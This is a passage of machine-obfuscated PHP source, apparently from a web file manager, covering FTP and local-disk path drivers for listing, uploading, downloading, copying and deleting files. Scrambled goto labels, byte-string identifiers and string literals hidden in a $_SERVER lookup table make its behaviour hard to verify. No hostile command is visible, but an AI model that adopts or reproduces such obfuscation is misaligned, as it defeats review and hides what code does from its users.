= $this->getPathOuter(rtrim($C‹¼çºÇøì, $aƒ´ò³¥¬[8])); $BŒ¥‚„·Ì® = $this->pathThis($e•Òë»²Èæ); goto a½èÛ×–…î; bá±µ‚Ë„å: $Aİ”—Ê¡ä[$aƒ´ò³¥¬[107]] = $Aİ”—Ê¡ä[$aƒ´ò³¥¬[107]] > 0 ? $Aİ”—Ê¡ä[$aƒ´ò³¥¬[107]] : 0; return $Aİ”—Ê¡ä; goto eˆ˜ŠŒßÙî; eˆ˜ŠŒßÙî: } public function size($A…µä³¯±Û) { $b±°ŞÖŸã‚ = $this->objectMeta($A…µä³¯±Û); return $b±°ŞÖŸã‚ ? $b±°ŞÖŸã‚[$_SERVER[¯Ò¬Èè][77]] : 0; } public function info($dÊÛ×¦µ†¦) { if ($this->isFile($dÊÛ×¦µ†¦)) { return $this->fileInfo($dÊÛ×¦µ†¦, 0); } else { if ($this->isFolder($dÊÛ×¦µ†¦)) { return $this->folderInfo($dÊÛ×¦µ†¦); } } return !1; } public function exist($DˆÂò‘áÙß) { return $this->objectMeta($DˆÂò‘áÙß) ? !0 : !1; } public function isFile($cÊš§ïŒª) { $FßªñïºÏ =& $_SERVER[¯Ò¬Èè]; $féæÊçåã… = $this->objectMeta($cÊš§ïŒª); return $féæÊçåã… ? $féæÊçåã…[$FßªñïºÏ[29]] == $FßªñïºÏ[167] : !1; } public function isFolder($C‘ÍºŠ½ïí) { $cä‘¦‰àÏÄ =& $_SERVER[¯Ò¬Èè]; $dÜ¹áïÎ = $this->objectMeta($C‘ÍºŠ½ïí); return $dÜ¹áïÎ ? $dÜ¹áïÎ[$cä‘¦‰àÏÄ[29]] == $cä‘¦‰àÏÄ[76] : !1; } public function listPath($B‡®²ĞĞ, $a—×ÊÃŞ‡œ = false) { goto CË¶£¢Ìœñ; Dè—‘ »•: foreach ($FŞÓ‡å»Ü as $B‡®²ĞĞ) { if ($this->isFolder($B‡®²ĞĞ)) { $E‡†›ÈÔ—[$cã†”ñî¦à[74]][] = $this->folderInfo($B‡®²ĞĞ, $a—×ÊÃŞ‡œ); } else { $E‡†›ÈÔ—[$cã†”ñî¦à[73]][] = $this->fileInfo($B‡®²ĞĞ, $a—×ÊÃŞ‡œ); } } return $E‡†›ÈÔ—; goto Bò½å§ğÏÃ; CË¶£¢Ìœñ: $cã†”ñî¦à =& $_SERVER[¯Ò¬Èè]; if (!$this->_isconn()) { return !1; } $B‡®²ĞĞ = $this->iconvSystem($B‡®²ĞĞ); goto FÒ‚Û©¨ªÄ; FÒ‚Û©¨ªÄ: $FŞÓ‡å»Ü = $this->ftpList($B‡®²ĞĞ); $E‡†›ÈÔ— = array($cã†”ñî¦à[74] => array(), $cã†”ñî¦à[73] => array()); if (!$FŞÓ‡å»Ü) { return $E‡†›ÈÔ—; } goto Dè—‘ »•; Bò½å§ğÏÃ: } public function has($EßÓÜÒ›õ, $A‚ÍÇ÷¥Ã = false, $dÃ µ­¹ËÈ = true) { goto E«ÃÂ•¨«ô; E«ÃÂ•¨«ô: $A’íƒ¢ó½¬ =& $_SERVER[¯Ò¬Èè]; if (!$this->_isconn()) { return !1; } $EßÓÜÒ›õ = $this->iconvSystem($EßÓÜÒ›õ); goto A“ÎÂ¯áçæ; c¸ÆÜà÷²¹: foreach ($B‚°ö÷¹›© as $EßÓÜÒ›õ) { if ($dÃ µ­¹ËÈ) { if (!$this->isFolder($EßÓÜÒ›õ)) { return !0; } } else { if ($this->isFolder($EßÓÜÒ›õ)) { return !0; } } } return !1; goto F¼±°ª­ˆ‹; A“ÎÂ¯áçæ: $B‚°ö÷¹›© = $this->ftpList($EßÓÜÒ›õ); if (!$B‚°ö÷¹›©) { return !1; } if ($A‚ÍÇ÷¥Ã) { return array($A’íƒ¢ó½¬[191] => 0, $A’íƒ¢ó½¬[192] => count($B‚°ö÷¹›©)); } goto c¸ÆÜà÷²¹; F¼±°ª­ˆ‹: } public function listAll($dš…µ²«·¸) { goto cóÌ‘•“Òƒ; cóÌ‘•“Òƒ: $cÜÂ—å¡÷à =& $_SERVER[¯Ò¬Èè]; if (!$this->_isconn()) { return !1; } $dš…µ²«·¸ = $this->iconvSystem($dš…µ²«·¸); goto dßòÈÎŸÖ; CÒ¹·Â: foreach ($dİˆÍÉ‘˜[$cÜÂ—å¡÷à[74]] as $E±â¾äĞÊã) { $C×å×¬ï¢[] = array($cÜÂ—å¡÷à[75] => $cÜÂ—å¡÷à[8] . trim(str_replace($dš…µ²«·¸, $cÜÂ—å¡÷à[33], $E±â¾äĞÊã), $cÜÂ—å¡÷à[8]) . $cÜÂ—å¡÷à[8], $cÜÂ—å¡÷à[76] => 1, $cÜÂ—å¡÷à[77] => 0); } foreach ($dİˆÍÉ‘˜[$cÜÂ—å¡÷à[73]] as $F––Ø®‰Ü†) { $C×å×¬ï¢[] = array($cÜÂ—å¡÷à[75] => $cÜÂ—å¡÷à[8] . trim(str_replace($dš…µ²«·¸, $cÜÂ—å¡÷à[33], $F––Ø®‰Ü†), $cÜÂ—å¡÷à[8]), $cÜÂ—å¡÷à[76] => 0, $cÜÂ—å¡÷à[77] => $this->size($F––Ø®‰Ü†)); } return $C×å×¬ï¢; goto C¥°¼¾¾ó»; dßòÈÎŸÖ: $dİˆÍÉ‘˜ = array($cÜÂ—å¡÷à[73] => array(), $cÜÂ—å¡÷à[74] => array()); $this->recursionFtpFiles($dš…µ²«·¸, $dİˆÍÉ‘˜); $C×å×¬ï¢ = array(); goto CÒ¹·Â; C¥°¼¾¾ó»: } public function getContent($C•†Á·åéé) { if (!$this->_isconn()) { return !1; } $C•†Á·åéé = $this->iconvSystem($C•†Á·åéé); return $this->fileSubstr($C•†Á·åéé); } public function setContent($D¡Ó’éÒÚ, $bäõÉõê¥æ = '') { goto fëÌ’¶øø¥; F×çÎà»‰¬: file_put_contents($c‰ã¯Ñ¿, $bäõÉõê¥æ); $a³ñÈåÀ = $this->upload($D¡Ó’éÒÚ, $this->iconvApp($c‰ã¯Ñ¿)); $this->tempFileRemve($c‰ã¯Ñ¿); goto D†È‡íÒÏ; D†È‡íÒÏ: return $a³ñÈåÀ; goto eœÛ±ì¥ó·; fëÌ’¶øø¥: if (!$this->_isconn()) { return !1; } $Fàá´‘À» = $this->pathThis($this->iconvSystem($D¡Ó’éÒÚ)); $c‰ã¯Ñ¿ = $this->tempFile($Fàá´‘À»); goto F×çÎà»‰¬; eœÛ±ì¥ó·: } public function fileSubstr($cä¸Ò´Á±Â, $eô÷¤¢¢âò = 0, $e…¶‹ùƒ³º = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($cä¸Ò´Á±Â, $eô÷¤¢¢âò, $e…¶‹ùƒ³º); } private function ftpRequest($FôêØ¦§ğ, $Bœ‡–Ì‰¯Š = 0, $D”»æ¨ùŒ = false) { goto Bø»Ï´¬«Ç; Bø»Ï´¬«Ç: $FôêØ¦§ğ = $this->iconvSystem($FôêØ¦§ğ); $c×é¯¸‹‹ = $this->scheme . $this->host . $_SERVER[¯Ò¬Èè][4] . $this->port; $AÄ–ÏƒÊ‡¼ = curl_init(); goto E†‰íÍ·Ó; E†‰íÍ·Ó: curl_setopt($AÄ–ÏƒÊ‡¼, CURLOPT_URL, $c×é¯¸‹‹ . $this->pathEncode($FôêØ¦§ğ)); curl_setopt($AÄ–ÏƒÊ‡¼, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($D”»æ¨ùŒ) { $a»ó‹†Ÿ…Ä = $Bœ‡–Ì‰¯Š + $D”»æ¨ùŒ - 1; curl_setopt($AÄ–ÏƒÊ‡¼, CURLOPT_RANGE, "{$Bœ‡–Ì‰¯Š}\55{$a»ó‹†Ÿ…Ä}"); } goto cå¾šÕáÀ ; cå¾šÕáÀ : curl_setopt($AÄ–ÏƒÊ‡¼, CURLOPT_RETURNTRANSFER, 1); $AáŠŒÂ­§² = curl_exec($AÄ–ÏƒÊ‡¼); curl_close($AÄ–ÏƒÊ‡¼); goto eÅˆªÕ°ß¿; eÅˆªÕ°ß¿: return $AáŠŒÂ­§²; goto EÛµ¹öğ¸ç; EÛµ¹öğ¸ç: } public function upload($fÔ £¤¥Ê¨, $Cˆ÷íœ•“ª, $A®ÎÈ×Ä¾¹ = false, $C¢æ¤½„ëÓ = REPEAT_REPLACE) { goto c—Ò‘Å¦¸Ñ; c—Ò‘Å¦¸Ñ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($fÔ £¤¥Ê¨))) { return !1; } $fÔ £¤¥Ê¨ = $this->iconvSystem($fÔ £¤¥Ê¨); goto BÍ’º†«÷¼; CÍŠƒ¼ö¸˜: if ($Dîå‘±‡ÜÅ != FTP_FINISHED) { return !1; } return $this->getPathOuter($fÔ £¤¥Ê¨); goto b¬´Ş¢‡Ì; BÍ’º†«÷¼: $Cˆ÷íœ•“ª = $this->iconvSystem($Cˆ÷íœ•“ª); $Dîå‘±‡ÜÅ = ftp_nb_put($this->connect, $fÔ £¤¥Ê¨, $Cˆ÷íœ•“ª, FTP_BINARY); while ($Dîå‘±‡ÜÅ == FTP_MOREDATA) { $Dîå‘±‡ÜÅ = ftp_nb_continue($this->connect); } goto CÍŠƒ¼ö¸˜; b¬´Ş¢‡Ì: } public function download($Cù‡Øß÷èã, $CœÃŒ¬ÛèÁ = '') { goto fâŠªñß›´; fâŠªñß›´: if (!$this->_isconn()) { return !1; } $aÚ¤ó²à—£ = $this->pathFather($CœÃŒ¬ÛèÁ); if (!IO::mkdir($aÚ¤ó²à—£)) { return !1; } goto B‹ßÊÀáÜ÷; E–¼ èµõ‡: while ($cÄËœ×Œ£ == FTP_MOREDATA) { $cÄËœ×Œ£ = ftp_nb_continue($this->connect); } if ($cÄËœ×Œ£ != FTP_FINISHED) { return !1; } return $this->iconvApp($CœÃŒ¬ÛèÁ); goto f«éß‹Ÿñ…; B‹ßÊÀáÜ÷: $Cù‡Øß÷èã = $this->iconvSystem($Cù‡Øß÷èã); $CœÃŒ¬ÛèÁ = $this->iconvSystem($CœÃŒ¬ÛèÁ); $cÄËœ×Œ£ = ftp_nb_get($this->connect, $CœÃŒ¬ÛèÁ, $Cù‡Øß÷èã, FTP_BINARY); goto E–¼ èµõ‡; f«éß‹Ÿñ…: } private function ftpList($fÖ…Ùˆõù‰) { goto cÕÖôÕò¥; BãƒÊ„´¾Æ: $fÖ…Ùˆõù‰ = rtrim($fÖ…Ùˆõù‰, $f­ˆ¢•‹ã[8]) . $f­ˆ¢•‹ã[8]; $eˆõ´– = @ftp_nlist($this->connect, $fÖ…Ùˆõù‰); if ($eˆõ´– === !1) { $eˆõ´– = @ftp_rawlist($this->connect, $fÖ…Ùˆõù‰); foreach ($eˆõ´– as $d»òä°ò‚§ => $AŒÚŞ…¡¿) { $eˆõ´–[$d»òä°ò‚§] = end(explode($f­ˆ¢•‹ã[1172], $AŒÚŞ…¡¿)); } } goto aë¯ÓÂ©æĞ; cÕÖôÕò¥: $f­ˆ¢•‹ã =& $_SERVER[¯Ò¬Èè]; if (!$this->isFolder($fÖ…Ùˆõù‰)) { return !1; } @ftp_chdir($this->connect, $f­ˆ¢•‹ã[8]); goto BãƒÊ„´¾Æ; BÜ¨’…ß–Î: return $E•ª¿É‡Ô; goto aŒõ”ÃàŞ; aë¯ÓÂ©æĞ: $eˆõ´– = array_diff($eˆõ´–, array($f­ˆ¢•‹ã[91], $f­ˆ¢•‹ã[1173], $fÖ…Ùˆõù‰ . $f­ˆ¢•‹ã[91], $fÖ…Ùˆõù‰ . $f­ˆ¢•‹ã[1173])); $E•ª¿É‡Ô = array(); foreach ($eˆõ´– as $fÕÀ¾ªô›¸) { if (!strstr($fÕÀ¾ªô›¸, $f­ˆ¢•‹ã[8])) { $fÕÀ¾ªô›¸ = $fÖ…Ùˆõù‰ . ltrim($fÕÀ¾ªô›¸, $f­ˆ¢•‹ã[8]); } $E•ª¿É‡Ô[] = $this->iconvApp($fÕÀ¾ªô›¸); } goto BÜ¨’…ß–Î; aŒõ”ÃàŞ: } private function recursionFtpFiles($cô„§İšë, &$CØ–»™©ªÅ) { $FœÕöŒ¯®‚ =& $_SERVER[¯Ò¬Èè]; if (!$this->_isconn()) { return !1; } if (!($B·•ä˜ôßÎ = $this->ftpList($cô„§İšë))) { return !1; } foreach ($B·•ä˜ôßÎ as $cô„§İšë) { if ($this->isFolder($cô„§İšë)) { $this->recursionFtpFiles($cô„§İšë, $CØ–»™©ªÅ); $CØ–»™©ªÅ[$FœÕöŒ¯®‚[74]][] = $cô„§İšë; } else { $CØ–»™©ªÅ[$FœÕöŒ¯®‚[73]][] = $cô„§İšë; } } } private function objectMeta($BÏ§ïÅŠùˆ) { goto fÜÅËéó”ä; fÜÅËéó”ä: $f×­Ú»Öã» =& $_SERVER[¯Ò¬Èè]; $FÄ‰…õ§ğ = $f×­Ú»Öã»[1174] . md5($BÏ§ïÅŠùˆ); $Bäé¸“†Ü = Cache::get($FÄ‰…õ§ğ); goto eéÇ¥Üƒ„Í; eéÇ¥Üƒ„Í: if ($Bäé¸“†Ü !== null && $Bäé¸“†Ü !== !1) { return $Bäé¸“†Ü; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $f×­Ú»Öã»[8]); goto D÷¯çïë ¡; D÷¯çïë ¡: $F™ŞïÙ›ø½ = @ftp_size($this->connect, $this->iconvSystem($BÏ§ïÅŠùˆ)); if ($F™ŞïÙ›ø½ != -1) { $Bäé¸“†Ü = array($f×­Ú»Öã»[77] => $F™ŞïÙ›ø½, $f×­Ú»Öã»[29] => $f×­Ú»Öã»[167]); } else { $E°óÂ’ê‚à = @ftp_chdir($this->connect, $this->iconvSystem($BÏ§ïÅŠùˆ)); $Bäé¸“†Ü = $E°óÂ’ê‚à ? array($f×­Ú»Öã»[77] => 0, $f×­Ú»Öã»[29] => $f×­Ú»Öã»[76]) : !1; } Cache::set($FÄ‰…õ§ğ, $Bäé¸“†Ü, 0); goto A‚ßÏäé ; A‚ßÏäé : return $Bäé¸“†Ü; goto e”Ğƒø¿¨â; e”Ğƒø¿¨â: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($bé¿ÜìÙ‹) { if (substr($bé¿ÜìÙ‹, 0, 2) == $_SERVER[¯Ò¬Èè][1163]) { $bé¿ÜìÙ‹ = BASIC_PATH . substr($bé¿ÜìÙ‹, 2); } return $bé¿ÜìÙ‹; } public function iconvApp($b¯èğ¤¼Æ) { $DœøÎ›ÛÑÁ =& $_SERVER[¯Ò¬Èè]; global $config; return $this->iconvTo($b¯èğ¤¼Æ, $config[$DœøÎ›ÛÑÁ[1161]], $config[$DœøÎ›ÛÑÁ[1160]]); } public function iconvSystem($b‘¤‹¯İ) { $e£ÏÂôëÔØ =& $_SERVER[¯Ò¬Èè]; global $config; return $this->iconvTo($b‘¤‹¯İ, $config[$e£ÏÂôëÔØ[1160]], $config[$e£ÏÂôëÔØ[1161]]); } public function getPathOuter($FØ©„ÇÁ„) { goto E¬àêÒÇèô; B­ö¹„ñ: $FØ©„ÇÁ„ = KodIO::clear($FØ©„ÇÁ„); $FØ©„ÇÁ„ = substr($FØ©„ÇÁ„, strlen($eá—…ƒÌ›½)); if (empty($this->pathDriver)) { return $FØ©„ÇÁ„; } goto b………ğñ‹; E¬àêÒÇèô: $bÚÀœ¬ÑŒÌ =& $_SERVER[¯Ò¬Èè]; $eá—…ƒÌ›½ = $this->iconvApp($this->pathBase); $FØ©„ÇÁ„ = $this->iconvApp($FØ©„ÇÁ„); goto A˜¤Œ°Å­±; b………ğñ‹: return $this->pathDriver . $bÚÀœ¬ÑŒÌ[8] . ltrim($FØ©„ÇÁ„, $bÚÀœ¬ÑŒÌ[8]); goto Bƒ„Î¬øñ´; A˜¤Œ°Å­±: if (substr($eá—…ƒÌ›½, 0, 2) == $bÚÀœ¬ÑŒÌ[1163]) { $eá—…ƒÌ›½ = BASIC_PATH . substr($eá—…ƒÌ›½, 2); } if (substr($FØ©„ÇÁ„, 0, 2) == $bÚÀœ¬ÑŒÌ[1163]) { $FØ©„ÇÁ„ = BASIC_PATH . substr($FØ©„ÇÁ„, 2); } $eá—…ƒÌ›½ = KodIO::clear($eá—…ƒÌ›½); goto B­ö¹„ñ; Bƒ„Î¬øñ´: } public function mkfile($b³÷§³Ñèì, $BŸ¬ó‚Æì = '', $cÍ²¹ñ½–ƒ = REPEAT_RENAME) { $b³÷§³Ñèì = $this->iconvSystem($b³÷§³Ñèì); @touch($b³÷§³Ñèì); if ($BŸ¬ó‚Æì) { file_put_contents($b³÷§³Ñèì, $BŸ¬ó‚Æì); } return is_file($b³÷§³Ñèì) ? $this->getPathOuter($b³÷§³Ñèì) : !1; } public function mkdir($e¶…Ú†¯öÃ, $e”Ê§«ˆâœ = REPEAT_SKIP) { $e¶…Ú†¯öÃ = $this->iconvSystem($e¶…Ú†¯öÃ); if (is_dir($e¶…Ú†¯öÃ)) { return $this->getPathOuter($e¶…Ú†¯öÃ); } @mkdir($e¶…Ú†¯öÃ, 511, !0); return is_dir($e¶…Ú†¯öÃ) ? $this->getPathOuter($e¶…Ú†¯öÃ) : !1; } public function copyFile($c±‚²ˆŞ‡ï, $BÉĞæãˆÀô) { $this->mkdir($this->pathFather($BÉĞæãˆÀô)); $c±‚²ˆŞ‡ï = $this->iconvSystem($c±‚²ˆŞ‡ï); $BÉĞæãˆÀô = $this->iconvSystem($BÉĞæãˆÀô); $A­ÛƒÈ¾† = @copy($c±‚²ˆŞ‡ï, $BÉĞæãˆÀô); return $A­ÛƒÈ¾† ? $this->getPathOuter($BÉĞæãˆÀô) : !1; } public function moveFile($F·ĞğÈ†–¥, $FºÇ³è’ô…) { $this->mkdir($this->pathFather($FºÇ³è’ô…)); $F·ĞğÈ†–¥ = $this->iconvSystem($F·ĞğÈ†–¥); $FºÇ³è’ô… = $this->iconvSystem($FºÇ³è’ô…); $A¦Ûö‡ªß = intval(@rename($F·ĞğÈ†–¥, $FºÇ³è’ô…)); if (!$A¦Ûö‡ªß) { if ($A¦Ûö‡ªß = intval(@copy($F·ĞğÈ†–¥, $FºÇ³è’ô…))) { @unlink($F·ĞğÈ†–¥); } } return $A¦Ûö‡ªß ? $this->getPathOuter($FºÇ³è’ô…) : !1; } public function delFile($CóŒ¬¶ÁŞ) { $CóŒ¬¶ÁŞ = $this->iconvSystem($CóŒ¬¶ÁŞ); if (!@unlink($CóŒ¬¶ÁŞ)) { @chmod($CóŒ¬¶ÁŞ, 511); if (!@unlink($CóŒ¬¶ÁŞ)) { return !1; } } else { return !0; } } public function delFolder($aœ¤·Şî²ˆ) { goto E˜ÇİéÕŸ; b£¤ï„‰÷È: if (!($C£ˆè¾‡×‹ = opendir($aœ¤·Şî²ˆ))) { return !1; } while (($cÎíè„×à = readdir($C£ˆè¾‡×‹)) !== !1) { if ($cÎíè„×à == $aò½Šñâ[91] || $cÎíè„×à == $aò½Šñâ[1173]) { continue; } $cíÅËâªê = $aœ¤·Şî²ˆ . $aò½Šñâ[8] . $cÎíè„×à; if (is_file($cíÅËâªê) || is_link($cíÅËâªê)) { if (!unlink($cíÅËâªê)) { chmod($cíÅËâªê, 511); if (!unlink($cíÅËâªê)) { return !1; } } } else { if (is_dir($cíÅËâªê)) { chmod($cíÅËâªê, 511); $cíÅËâªê = $this->iconvApp($cíÅËâªê); if (!$this->delFolder($cíÅËâªê)) { return !1; } } } } closedir($C£ˆè¾‡×‹); goto A´ö¨ôòé†; A´ö¨ôòé†: return rmdir($aœ¤·Şî²ˆ); goto b‹¨Ö¡¯òµ; E˜ÇİéÕŸ: $aò½Šñâ =& $_SERVER[¯Ò¬Èè]; $aœ¤·Şî²ˆ = $this->iconvSystem($aœ¤·Şî²ˆ); if (!is_dir($aœ¤·Şî²ˆ)) { return !0; } goto b£¤ï„‰÷È; b‹¨Ö¡¯òµ: } public function rename($BÛ¸ª»è¦×, $cª©­à£ñ) { goto bŠÓè¢×ã’; bŠÓè¢×ã’: $cš“ÁœÇÁ =& $_SERVER[¯Ò¬Èè]; $FÓáÌ‚Ë« = $this->fileNameAuto($this->pathFather($BÛ¸ª»è¦×), $cª©­à£ñ); $FÓáÌ‚Ë« = $this->iconvSystem($FÓáÌ‚Ë«); goto DÖ™ƒÍÙ­‚; AŠ»®‡¼Õì: $f¨±¨…¥Õµ = @rename($BÛ¸ª»è¦×, $EÑÂ‡½ÕÁ); $EÑÂ‡½ÕÁ = $this->iconvApp($EÑÂ‡½ÕÁ); return $f¨±¨…¥Õµ ? $this->getPathOuter($EÑÂ‡½ÕÁ) : !1; goto EªÔ´´å‹; DÖ™ƒÍÙ­‚: $BÛ¸ª»è¦× = $this->iconvSystem($BÛ¸ª»è¦×); $dñ¡Ğƒ¤— = $this->pathFather($BÛ¸ª»è¦×); $EÑÂ‡½ÕÁ = rtrim($dñ¡Ğƒ¤—, $cš“ÁœÇÁ[8]) . $cš“ÁœÇÁ[8] . $FÓáÌ‚Ë«; goto AŠ»®‡¼Õì; EªÔ´´å‹: } public function size($d¡À¶‹•™Ó) { $d¡À¶‹•™Ó = $this->iconvSystem($d¡À¶‹•™Ó); return (double) abs(sprintf($_SERVER[¯Ò¬Èè][1175], @filesize($d¡À¶‹•™Ó))); } public function info($F—¦›àñÃä) { $F—¦›àñÃä = $this->iconvSystem($F—¦›àñÃä); if ($this->isFolder($F—¦›àñÃä)) { return $this->folderInfo($F—¦›àñÃä); } else { if ($this->isFile($F—¦›àñÃä)) { return $this->fileInfo($F—¦›àñÃä); } } return !1; } protected function infoChildren($D×Ó»ù­óÆ, &$f­¢’—‘î§, $EŠÔˆâ¾êš = true) { goto eø‡ğÔ ¢„; F·‹®”Ûç: closedir($dÍ›Ñ©“Ê); goto dš´‹æ²³ˆ; AİÕ˜Ò¡Ÿ: if ($EŠÔˆâ¾êš) { $D×Ó»ù­óÆ = $this->iconvSystem($D×Ó»ù­óÆ); } if (!($dÍ›Ñ©“Ê = @opendir($D×Ó»ù­óÆ))) { return; } while (($d…Ù¶­¶º˜ = readdir($dÍ›Ñ©“Ê)) !== !1) { if ($d…Ù¶­¶º˜ == $b™µ“´‚™‡[91] || $d…Ù¶­¶º˜ == $b™µ“´‚™‡[1173]) { continue; } $cš½¾–¼• = $D×Ó»ù­óÆ . $d…Ù¶­¶º˜; if (is_file($cš½¾–¼•) || is_link($cš½¾–¼•)) { $f­¢’—‘î§[$b™µ“´‚™‡[78]]++; $f­¢’—‘î§[$b™µ“´‚™‡[77]] += (double) abs(sprintf($b™µ“´‚™‡[1175], @filesize($cš½¾–¼•))); } else { if (is_dir($cš½¾–¼•)) { $f­¢’—‘î§[$b™µ“´‚™‡[79]]++; $this->infoChildren($cš½¾–¼•, $f­¢’—‘î§, !1); } } } goto F·‹®”Ûç; eø‡ğÔ ¢„: $b™µ“´‚™‡ =& $_SERVER[¯Ò¬Èè]; check_abort(); $D×Ó»ù­óÆ = rtrim($D×Ó»ù­óÆ, $b™µ“´‚™‡[8]) . $b™µ“´‚™‡[8]; goto AİÕ˜Ò¡Ÿ; dš´‹æ²³ˆ: } private function folderInfo($Aó‰Ä½Ï†˜, $FõİîÆÃò” = false) { $eì¯µ³‚ =& $_SERVER[¯Ò¬Èè]; $Aó‰Ä½Ï†˜ = rtrim($Aó‰Ä½Ï†˜, $eì¯µ³‚[8]) . $eì¯µ³‚[8]; $cµ·‚éÜœô = $this->iconvApp($this->pathThis($Aó‰Ä½Ï†˜)); if ($FõİîÆÃò”) { return array($eì¯µ³‚[28] => $cµ·‚éÜœô, $eì¯µ³‚[75] => $this->getPathOuter($Aó‰Ä½Ï†˜), $eì¯µ³‚[29] => $eì¯µ³‚[76]); } $e˜‚ƒÆÄ±© = array($eì¯µ³‚[28] => $cµ·‚éÜœô, $eì¯µ³‚[75] => $this->getPathOuter($Aó‰Ä½Ï†˜), $eì¯µ³‚[29] => $eì¯µ³‚[76], $eì¯µ³‚[187] => @filectime($Aó‰Ä½Ï†˜), $eì¯µ³‚[107] => @filemtime($Aó‰Ä½Ï†˜), $eì¯µ³‚[1176] => @fileatime($Aó‰Ä½Ï†˜), $eì¯µ³‚[1170] => is_readable($Aó‰Ä½Ï†˜), $eì¯µ³‚[1171] => is_writable($Aó‰Ä½Ï†˜), $eì¯µ³‚[1177] => get_mode($Aó‰Ä½Ï†˜)); return $e˜‚ƒÆÄ±©; } private function fileInfo($f²È›Ğ´…æ, $FëÉ¢È“¬ˆ = false) { $bŒêŒºËŠ› =& $_SERVER[¯Ò¬Èè]; $cÀ¯Ş°Ã ç = $this->iconvApp($this->pathThis($f²È›Ğ´…æ)); if ($FëÉ¢È“¬ˆ) { return array($bŒêŒºËŠ›[28] => $cÀ¯Ş°Ã ç, $bŒêŒºËŠ›[75] => $this->getPathOuter($f²È›Ğ´…æ), $bŒêŒºËŠ›[29] => $bŒêŒºËŠ›[167], $bŒêŒºËŠ›[77] => $this->size($f²È›Ğ´…æ), $bŒêŒºËŠ›[160] => $this->ext($cÀ¯Ş°Ã ç)); } $aÆ»Ë¯Ï¡Ø = array($bŒêŒºËŠ›[28] => $cÀ¯Ş°Ã ç, $bŒêŒºËŠ›[75] => $this->getPathOuter($f²È›Ğ´…æ), $bŒêŒºËŠ›[29] => $bŒêŒºËŠ›[167], $bŒêŒºËŠ›[187] => @filectime($f²È›Ğ´…æ), $bŒêŒºËŠ›[107] => @filemtime($f²È›Ğ´…æ), $bŒêŒºËŠ›[1176] => @fileatime($f²È›Ğ´…æ), $bŒêŒºËŠ›[77] => $this->size($f²È›Ğ´…æ), $bŒêŒºËŠ›[160] => $this->ext($cÀ¯Ş°Ã ç), $bŒêŒºËŠ›[1170] => is_readable($f²È›Ğ´…æ), $bŒêŒºËŠ›[1171] => is_writable($f²È›Ğ´…æ), $bŒêŒºËŠ›[1177] => get_mode($f²È›Ğ´…æ)); return $aÆ»Ë¯Ï¡Ø; } public function exist($aÎğÌ•åÌ) { $aÎğÌ•åÌ = $this->iconvSystem($aÎğÌ•åÌ); return @file_exists($aÎğÌ•åÌ); } public function isFile($B¯®œ¯«ª¶) { $B¯®œ¯«ª¶ = $this->iconvSystem($B¯®œ¯«ª¶); return @is_file($B¯®œ¯«ª¶); } public function isFolder($d¶ÃÏÀâ‹Ï) { $d¶ÃÏÀâ‹Ï = $this->iconvSystem($d¶ÃÏÀâ‹Ï); return @is_dir($d¶ÃÏÀâ‹Ï); } public function listPath($AÓ£§ËÒŠÛ, $C§ÑÑ±çÕ° = false) { goto A…ˆ÷Û¡Ù; BóÈ‹‹¿©: closedir($Bì¤È…ø×Ğ); return $BŒ›ËÙŞ; goto EŠĞƒÃ¤‚›; d…è†Î„„ø: $BŒ›ËÙŞ = array($E‘‚²¾äÜÄ[74] => array(), $E‘‚²¾äÜÄ[73] => array()); if (!($Bì¤È…ø×Ğ = @opendir($AÓ£§ËÒŠÛ))) { return $BŒ›ËÙŞ; } while (($fäÄ®ÅœªÀ = readdir($Bì¤È…ø×Ğ)) !== !1) { if ($fäÄ®ÅœªÀ == $E‘‚²¾äÜÄ[91] || $fäÄ®ÅœªÀ == $E‘‚²¾äÜÄ[1173]) { continue; } $e¿…²èÂ‡¥ = $AÓ£§ËÒŠÛ . $fäÄ®ÅœªÀ; if (is_file($e¿…²èÂ‡¥)) { $BŒ›ËÙŞ[$E‘‚²¾äÜÄ[73]][] = $this->fileInfo($e¿…²èÂ‡¥, $C§ÑÑ±çÕ°); } else { $BŒ›ËÙŞ[$E‘‚²¾äÜÄ[74]][] = $this->folderInfo($e¿…²èÂ‡¥, $C§ÑÑ±çÕ°); } } goto BóÈ‹‹¿©; A…ˆ÷Û¡Ù: $E‘‚²¾äÜÄ =& $_SERVER[¯Ò¬Èè]; $AÓ£§ËÒŠÛ = $this->iconvSystem($AÓ£§ËÒŠÛ); $AÓ£§ËÒŠÛ = rtrim($AÓ£§ËÒŠÛ, $E‘‚²¾äÜÄ[8]) . $E‘‚²¾äÜÄ[8]; goto d…è†Î„„ø; EŠĞƒÃ¤‚›: } public function listAll($FÂ˜ÚÄç‡, &$c˜ª„¹ï¿é = array()) { goto D’ñƒ½Ñ§Æ; fĞàïÍÍ·Ş: if (!($EëËßĞ’Œ¶ = @opendir($FÂ˜ÚÄç‡))) { return $c˜ª„¹ï¿é; } while (($Eª§•Ã¬ëÁ = readdir($EëËßĞ’Œ¶)) !== !1) { if ($Eª§•Ã¬ëÁ == $aÎƒ©¹àª“[91] || $Eª§•Ã¬ëÁ == $aÎƒ©¹àª“[1173]) { continue; } $e¸Øƒ›×®ƒ = $FÂ˜ÚÄç‡ . $Eª§•Ã¬ëÁ; if (is_dir($e¸Øƒ›×®ƒ) && !is_link($e¸Øƒ›×®ƒ)) { $c˜ª„¹ï¿é[] = array($aÎƒ©¹àª“[75] => $e¸Øƒ›×®ƒ . $aÎƒ©¹àª“[8], $aÎƒ©¹àª“[76] => 1, $aÎƒ©¹àª“[107] => @filemtime($e¸Øƒ›×®ƒ), $aÎƒ©¹àª“[77] => 0); $this->listAll($e¸Øƒ›×®ƒ, $c˜ª„¹ï¿é); } else { $c˜ª„¹ï¿é[] = array($aÎƒ©¹àª“[75] => $e¸Øƒ›×®ƒ, $aÎƒ©¹àª“[76] => 0, $aÎƒ©¹àª“[107] => @filemtime($e¸Øƒ›×®ƒ), $aÎƒ©¹àª“[77] => $this->size($e¸Øƒ›×®ƒ)); } } closedir($EëËßĞ’Œ¶); goto AÏ§‚×öó²; AÏ§‚×öó²: return $c˜ª„¹ï¿é; goto BìŠèé•ò”; D’ñƒ½Ñ§Æ: $aÎƒ©¹àª“ =& $_SERVER[¯Ò¬Èè]; $FÂ˜ÚÄç‡ = $this->iconvSystem($FÂ˜ÚÄç‡); $FÂ˜ÚÄç‡ = 